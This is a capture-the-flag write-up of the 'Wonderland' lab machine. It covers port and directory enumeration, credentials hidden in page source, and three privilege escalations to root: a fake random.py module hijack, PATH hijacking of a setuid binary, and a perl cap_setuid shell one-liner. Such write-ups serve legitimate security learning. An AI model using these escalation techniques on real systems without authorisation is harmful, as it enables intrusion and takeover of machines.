# Wonderland

_24th August 2020_

## Host enumeration

The initial scan reports the following.

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

### Analysis

Since HTTP is running on port 80, we can proceed to view the web page on `http://<IP>/`

## Web enumeration

Initial enumerations with wfuzz and `directory-list-medium` reveals a directory `/r` on the web server. Going with the general theme, `/a`, `/b`, `/i` and `/t` are all valid subdirectories. So, we navigate to `http://<IP>/r/a/b/b/i/t/` and sure enough, it gives us a web page.

### Analysis

A piece of code like so exists in the source code and seems to be the credentials for the user (alice).

```html
<p style="display: none;">alice:password</p>
```

## SSH

Trying to log in with the previous credentials to `alice@<IP>`, we get a shell.

```
alice@wonderland:~$
```

### Analysis

The current directory has the following files.

```
drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
```

The python script seems to randomly display 10 lines from a poem string.

```
The line was:	 And why the sea is boiling hot —
The line was:	 And this was odd, because, you know,
The line was:	 The sands were dry as dry.
The line was:	 And more, and more, and more —
The line was:	 There were no birds to fly.
The line was:	 Shining with all his might:
The line was:	 "A pleasant walk, a pleasant talk,
The line was:	 They wept like anything to see
The line was:	 "It seems a shame," the Walrus said,
The line was:	 All hopping through the frothy waves,
```

Checking the rights for the current user with `sudo -l`, we find the following.

```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

So, We can run sudo `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as the user (rabbit).
Since the script uses the `random` module, we can create a malicious script as a fake random module in the same directory so that the script executes our `random.py` instead of the real random module.

## Privilege escalation

The script to get shell can be created as follows.

```
import os

os.system('/bin/bash')
```

This is now stored as `random.py` in the same directory.

### Analysis

Upon execution as the user (rabbit) as `alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`, we get

```
rabbit@wonderland:~$
```

We have successfully escalated our privileges to the (rabbit) user.

## Execution flow hijacking

Looking in the rabbit directory at `/home/rabbit`, we find a file called teaParty which is a setuid Linux binary. Running it gives us the following.

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 24 Aug 2020 18:03:53 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Upon further examination of the source on downloading, we find that the binary uses the date command in bash. We can manipulate the PATH variable of this file and obtain a shell from the user which this file actually belongs to by creating a new bash script to get a shell (/bin/bash) and setting the new path like so: `export PATH=/home/rabbit:$PATH`.

### Analysis

Doing so gives us the prompt

```
hatter@wonderland:/home/rabbit$
```

We have escalated ourselves to the (hatter) user. Upon navigating to the `/home/hatter` directory, we find a `password.txt` file which contains a password for the (hatter) user. Checking for the rights of the user (hatter) with `sudo -l` does not give us much. Doing some basic enumeration reveals that perl has the following capability set: `cap_setuid+ep`. `perl` does not seem to run on the shell so we use the password obtained previously to get superuser by running `su hatter`(gid changes).

## Privilege escalation to (root)

Since we need to abuse the setuid capability using perl, we can check for the same on [gtfobins](https://gtfobins.github.io/gtfobins/perl/). This gives us an entry like so.

```sh
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

So we run the same on the machine using `/usr/bin/perl` and we get a shell for the (root) user.

### Analysis

Navigating to the `/home/alice` directory we find that we can now open the file `root.txt` and that it contatains the flag for the challenge. Navigating to `/root` gives us a file `user.txt` with another flag for the additional question.
